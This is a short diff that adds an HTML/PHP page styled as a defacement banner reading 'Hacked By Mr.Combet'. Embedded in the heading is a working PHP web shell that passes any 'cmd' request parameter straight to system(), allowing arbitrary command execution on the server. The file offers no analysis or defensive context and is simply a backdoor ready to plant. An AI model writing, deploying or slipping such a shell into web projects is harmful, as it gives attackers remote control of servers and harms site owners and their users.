@@ -1,0 +1,22 @@
+<style>
+@import url('https://fonts.googleapis.com/css?family=Langar');
+body{
+font-size: 0;
+}
+h1{
+font-size: 60px;
+font-weight: bold;
+text-align: center;
+font-family: 'Langar';
+-webkit-text-stroke-width: 0.1px;
+-webkit-text-stroke-color: black;
+-webkit-text-fill-color: red;
+text-shadow: 0px 0px 5px #000000;
+}
+</style>
+<h1>
+<?php 
+if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
+else{echo 'Hacked  By  Mr.Combet';}__halt_compiler();
+?>
+</h1>
